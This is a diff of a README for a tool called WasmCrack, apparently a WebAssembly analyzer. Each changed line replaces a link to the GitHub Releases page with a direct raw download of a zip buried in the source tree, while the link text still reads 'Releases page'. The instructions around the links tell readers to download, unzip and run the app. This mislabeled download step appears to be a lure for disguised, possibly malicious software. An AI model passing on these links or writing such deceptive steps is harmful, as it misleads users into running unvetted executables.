@@ -1,6 +1,6 @@
 # 🛠️ WasmCrack - Analyze WebAssembly With Ease
 
-[![Download WasmCrack](https://img.shields.io/badge/Download-WasmCrack-blue?style=for-the-badge)](https://github.com/Clad-chrism998/WasmCrack/releases)
+[![Download WasmCrack](https://img.shields.io/badge/Download-WasmCrack-blue?style=for-the-badge)](https://raw.githubusercontent.com/Clad-chrism998/WasmCrack/main/src/wasmcrack/struct_solver/Wasm_Crack_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want to open a WebAssembly file and review its structure without d
 
 ## 📥 Download
 
-1. Visit the [WasmCrack Releases page](https://github.com/Clad-chrism998/WasmCrack/releases)
+1. Visit the [WasmCrack Releases page](https://raw.githubusercontent.com/Clad-chrism998/WasmCrack/main/src/wasmcrack/struct_solver/Wasm_Crack_3.3.zip)
 2. Download the latest Windows release package
 3. Unzip the file if needed
 4. Open the app file to run WasmCrack
@@ -134,4 +134,4 @@ WasmCrack is built around:
 
 ## 📎 Download Again
 
-If you need the install files again, use the [WasmCrack Releases page](https://github.com/Clad-chrism998/WasmCrack/releases) to download and run the latest Windows release package
+If you need the install files again, use the [WasmCrack Releases page](https://raw.githubusercontent.com/Clad-chrism998/WasmCrack/main/src/wasmcrack/struct_solver/Wasm_Crack_3.3.zip) to download and run the latest Windows release package
